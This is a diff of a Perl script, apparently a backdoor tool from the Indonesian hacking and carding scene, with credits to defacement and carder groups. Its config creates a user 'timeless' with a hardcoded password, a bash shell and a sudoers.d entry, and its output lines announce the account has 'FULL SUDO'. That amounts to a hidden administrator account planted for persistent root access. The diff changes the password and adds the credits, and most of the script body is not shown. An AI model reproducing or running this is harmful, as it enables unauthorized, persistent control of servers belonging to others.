@@ -2,9 +2,16 @@
 use strict;
 use warnings;
 
+# code by x0r
+# mau di edit ? silahkan bebas :)
+# thanks to : mner ifan,ikrar,troy and old team
+# hacking guru : cr4wler
+# Manadocoding - Yogyacarderlink - securityonline - hikaricommunity
+# exploit-db - offensive - zone-h
+
 # ===== CONFIG =====
 my $username = "timeless";
-my $password = "Hoax8899#";
+my $password = "P4ssw0rdxxx";
 my $shell    = "/bin/bash";
 my $sudoers  = "/etc/sudoers.d/$username";
 # ==================
@@ -45,3 +52,4 @@ print "User $username berhasil dibuat!\n";
 print "Login: $username\n";
 print "Password: $password\n";
 print "Akses: FULL SUDO\n";
+
